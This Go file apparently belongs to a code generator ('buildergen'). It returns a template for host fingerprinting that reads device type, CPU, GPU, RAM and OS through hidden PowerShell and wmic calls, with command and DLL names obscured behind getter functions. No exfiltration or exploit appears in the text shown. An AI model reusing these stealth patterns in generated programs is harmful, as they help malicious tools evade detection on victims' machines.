package buildergen

import "strings"

func templateDeviceInfo() string {
	return strings.TrimSpace(`
func getDeviceType() string {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL(getKernel32DLL())
		getSystemPowerStatus := kernel32.NewProc(getSystemPowerStatusName())
		type SYSTEM_POWER_STATUS struct {
			ACLineStatus        byte
			BatteryFlag         byte
			BatteryLifePercent  byte
			SystemStatusFlag    byte
			BatteryLifeTime     uint32
			BatteryFullLifeTime uint32
		}
		var status SYSTEM_POWER_STATUS
		if r, _, _ := getSystemPowerStatus.Call(uintptr(unsafe.Pointer(&status))); r != 0 {
			if status.BatteryFlag != 128 {
				return getLaptopLabel()
			}
		}
	}
	return getDesktopLabel()
}

func getCPUInfo() string {
	if runtime.GOOS == "windows" {
		out, err := cmdHidden(getPowerShellExeName(), "-NoProfile", "-NonInteractive", "-Command", getPsGetCpu()).Output()
		if err == nil {
			name := strings.TrimSpace(string(out))
			if name != "" {
				return name
			}
		}
		out, err = cmdHidden(getCmdExeName(), getCmdCArg(), getWmic(), getWmicGetCpu()).Output()
		if err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" && !strings.Contains(strings.ToLower(line), "name") {
					return line
				}
			}
		}
	}
	if runtime.GOOS == "linux" {
		out, err := exec.Command(getShCmd(), getDashCArg(), getLinuxCpuCmd()).Output()
		if err == nil {
			name := strings.TrimSpace(string(out))
			if name != "" {
				return name
			}
		}
	}
	if runtime.GOOS == "darwin" {
		out, err := exec.Command(getSysctlCmd(), getSysctlNameArg(), getDarwinCpuCmd()).Output()
		if err == nil {
			name := strings.TrimSpace(string(out))
			if name != "" {
				return name
			}
		}
	}
	return getUnknownCPU()
}

func getGPUInfo() string {
	if runtime.GOOS == "windows" {
		out, err := cmdHidden(getCmdExeName(), getCmdCArg(), getWmic(), getWmicGetGpu()).Output()
		if err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" && !strings.Contains(strings.ToLower(line), "name") {
					return line
				}
			}
		}
		out, err = cmdHidden(getPowerShellExeName(), "-NoProfile", "-NonInteractive", "-Command", getPsGetGpu()).Output()
		if err == nil {
			name := strings.TrimSpace(string(out))
			if name != "" {
				return name
			}
		}
	}
	return getUnknownGPU()
}

func getRAMInfo() string {
	if runtime.GOOS == "windows" {
		out, err := cmdHidden(getPowerShellExeName(), "-NoProfile", "-NonInteractive", "-Command", getPsGetRam()).Output()
		if err == nil {
			name := strings.TrimSpace(string(out))
			if name != "" {
				return name
			}
		}
		out, err = cmdHidden(getCmdExeName(), getCmdCArg(), getWmic(), getWmicGetRam()).Output()
		if err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" && !strings.Contains(strings.ToLower(line), "totalphysicalmemory") {
					return line
				}
			}
		}
	}
	return getUnknownRAM()
}

func getOSName() string {
	if runtime.GOOS == "windows" {
		out, err := cmdHidden(getPowerShellExeName(), "-NoProfile", "-NonInteractive", "-Command", getPsGetOs()).Output()
		if err == nil {
			name := strings.TrimSpace(string(out))
			if name != "" {
				return name
			}
		}
		out, err = cmdHidden(getCmdExeName(), getCmdCArg(), getWmic(), getWmicGetOs()).Output()
		if err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" && !strings.Contains(strings.ToLower(line), "caption") {
					return line
				}
			}
		}
	}
	return getUnknownOS()
}
`)
}